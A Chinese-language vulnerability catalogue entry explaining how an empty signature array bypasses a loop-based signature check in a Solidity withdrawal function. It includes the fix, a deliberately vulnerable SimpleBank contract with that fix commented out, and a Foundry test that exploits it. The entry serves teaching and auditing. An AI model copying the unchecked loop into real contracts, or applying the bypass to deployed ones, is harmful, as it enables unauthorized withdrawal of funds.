# 空循环

**名称：** 空循环问题

**说明：** 由于验证不充分，攻击者可以简单地传递一个空数组来绕过循环和签名验证。

**减轻：**

检查签名数量 require(sigs.length > 0, "未提供签名");

**参考：**

https://twitter.com/1nf0s3cpt/status/1673195574215213057

https://twitter.com/akshaysrivastv/status/1648310441058115592

https://dacian.me/exploiting-developer-assumptions#heading-unexpected-empty-inputs

**SimpleBank 合约样例:**

```jsx
contract SimpleBank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function withdraw(Signature[] calldata sigs) public {
        // Mitigation: Check the number of signatures
        //require(sigs.length > 0, "No signatures provided");
        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];
            // Verify every signature and revert if any of them fails to verify.
            verifySignatures(signature);
        }
        payable(msg.sender).transfer(1 ether);
    }

    receive() external payable {}
}
```

***\*测试方法:\****

仿真测试 --contracts src/test/**empty-loop.sol** -vvvv

```jsx
// Function to test a vulnerability related to signature validation
    function testVulnSignatureValidation() public {
        // Transfers 10 Ether to the SimpleBankContract
        payable(address(SimpleBankContract)).transfer(10 ether);
        
        // Alice's address is set as the first address in the virtual machine
        address alice = vm.addr(1);
        
        // Initiates a "prank" on Alice's account in the virtual machine
        vm.startPrank(alice);

        // Initializes an empty array of Signature structs from the SimpleBank contract
        SimpleBank.Signature[] memory sigs = new SimpleBank.Signature[](0); // empty input

        // Logs Alice's balance before the exploit
        console.log(
            "Before exploiting, Alice's ether balance",
            address(alice).balance
        );
        
        // Calls the withdraw function of the SimpleBank contract with the empty signatures array as the parameter
        // If the SimpleBank contract does not validate the signatures properly, this might result in unauthorized withdrawal
        SimpleBankContract.withdraw(sigs); 

        // Logs Alice's balance after the exploit
        console.log(
            "Afer exploiting, Alice's ether balance",
            address(alice).balance
        );
    }
```

**红色框：传递一个空数组以绕过验证。**

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0c65504d-c3f1-4ee1-b088-76f631784fb3%2FUntitled.png?table=block&id=aa602a09-ccf5-4348-87dd-8ae494f92e4c&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)